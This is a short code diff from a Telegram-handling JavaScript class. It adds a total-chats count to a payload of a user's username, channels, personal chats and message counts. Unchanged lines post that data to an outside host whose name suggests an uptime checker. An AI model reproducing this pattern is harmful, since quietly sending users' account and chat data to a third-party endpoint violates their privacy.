@@ -259,7 +259,8 @@ class TelegramManager {
                     userName: user.username ? `@${user.username}` : null,
                     channels: channels,
                     personalChats: personalChats,
-                    msgs: myMsgs['total']
+                    msgs: myMsgs['total'],
+                    totalChats: chats['total']
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
